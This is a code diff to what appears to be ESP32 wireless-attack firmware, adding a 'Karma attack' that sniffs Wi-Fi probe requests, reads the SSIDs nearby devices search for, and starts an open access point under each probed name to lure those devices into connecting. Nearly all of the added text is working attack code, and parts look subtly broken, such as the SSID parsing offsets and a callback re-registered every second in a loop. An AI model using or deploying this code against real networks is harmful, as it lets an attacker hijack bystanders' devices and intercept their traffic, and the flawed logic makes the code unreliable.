@@ -4500,3 +4500,102 @@ static void inject_sae_confirm_frame(void) {
     esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
     printf("SAE Confirm frame sent\n");
 }
+
+
+static bool karma_running = false;
+static TaskHandle_t karma_task_handle = NULL;
+
+static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
+
+    // Check if it's a probe request (subtype 4)
+    uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
+    if (subtype != 4) return;
+
+    // Extract SSID from probe request
+    const uint8_t *payload = ipkt->payload;
+    int ssid_offset = 0;
+    // Find SSID IE (0x00)
+    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
+        if (payload[ssid_offset] == 0x00) { // SSID IE
+            uint8_t ssid_len = payload[ssid_offset + 1];
+            if (ssid_len > 0 && ssid_len < 33) {
+                char probed_ssid[33] = {0};
+                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
+                printf("Probed SSID: %s\n", probed_ssid);
+                TERMINAL_VIEW_ADD_TEXT("Probed SSID: %s\n", probed_ssid);
+
+                // Start AP with probed SSID
+                wifi_config_t ap_config = {
+                    .ap = {
+                        .ssid = "",
+                        .ssid_len = ssid_len,
+                        .channel = 1,
+                        .authmode = WIFI_AUTH_OPEN,
+                        .max_connection = 4,
+                        .ssid_hidden = 0
+                    }
+                };
+                memcpy(ap_config.ap.ssid, probed_ssid, ssid_len);
+                ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+                ESP_ERROR_CHECK(esp_wifi_start());
+            }
+            break;
+        }
+        ssid_offset += payload[ssid_offset + 1] + 2;
+    }
+}
+
+static void karma_task(void *param) {
+    printf("Karma attack started\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
+
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+
+    while (karma_running) {
+        // This callback will be called for every management frame
+        // You need to register a callback that checks for probe requests
+        // and responds by creating an AP with the probed SSID
+
+        // For simplicity, let's assume you have a callback:
+        // karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+
+        // You can register it like this:
+        esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
+
+        vTaskDelay(pdMS_TO_TICKS(1000)); // Check every second
+    }
+
+    esp_wifi_set_promiscuous(false);
+    karma_task_handle = NULL;
+    printf("Karma attack stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_karma(void) {
+    if (karma_running) {
+        printf("Karma attack already running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
+        return;
+    }
+    karma_running = true;
+    xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
+}
+
+void wifi_manager_stop_karma(void) {
+    if (!karma_running) {
+        printf("Karma attack not running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
+        return;
+    }
+    karma_running = false;
+    // Task will clean up itself
+}
